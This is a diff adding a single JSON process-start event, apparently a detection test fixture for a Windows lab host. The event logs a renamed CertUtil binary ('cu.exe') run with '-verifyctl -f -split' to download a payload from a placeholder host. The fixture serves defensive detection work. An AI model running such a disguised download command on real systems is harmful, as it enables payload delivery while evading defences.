@@ -1,0 +1,24 @@
+{
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start"
+    ],
+    "kind": "event"
+  },
+  "host": {
+    "name": "ws-lab-11",
+    "os": {
+      "type": "windows"
+    }
+  },
+  "process": {
+    "name": "cu.exe",
+    "command_line": "cu.exe -verifyctl -f -split https://example.invalid/payload.bin",
+    "pe": {
+      "original_file_name": "CertUtil.exe"
+    }
+  }
+}
